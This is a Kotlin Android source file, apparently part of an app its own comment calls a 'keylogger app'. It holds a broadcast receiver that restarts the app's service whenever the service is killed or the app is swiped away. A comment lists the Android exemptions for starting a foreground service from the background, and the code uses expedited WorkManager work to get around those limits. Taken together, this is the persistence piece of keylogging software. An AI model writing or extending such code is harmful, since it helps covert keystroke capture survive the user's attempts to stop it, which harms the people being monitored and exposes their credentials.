package com.android.myapp.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.android.myapp.worker.ServiceCheckWorker
import timber.log.Timber

/**
 * Service Restart Receiver - Restarts service when it dies or keylogger app gets swiped to different app
 */
class ServiceRestartReceiver : BroadcastReceiver() {
    
    companion object {
        private const val TAG = "ServiceRestartReceiver"
    }

    // WorkManager is used because it handles the android restrictions for starting fgs:
    /*
       Starting FGS from background is BLOCKED except when:
       App is in foreground
       App has visible activity
       Called from high-priority FCM
       User interacted with UI element
       Exact alarm callback
       App is current IME
       App has device owner/profile owner
       WorkManager expedited work
    */
    override fun onReceive(context: Context, intent: Intent) {
        Timber.tag(TAG).d("Service restart triggered")
        
        val workRequest = OneTimeWorkRequestBuilder<ServiceCheckWorker>()
            .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
            .build()
        
        WorkManager.getInstance(context).enqueue(workRequest)
    }
}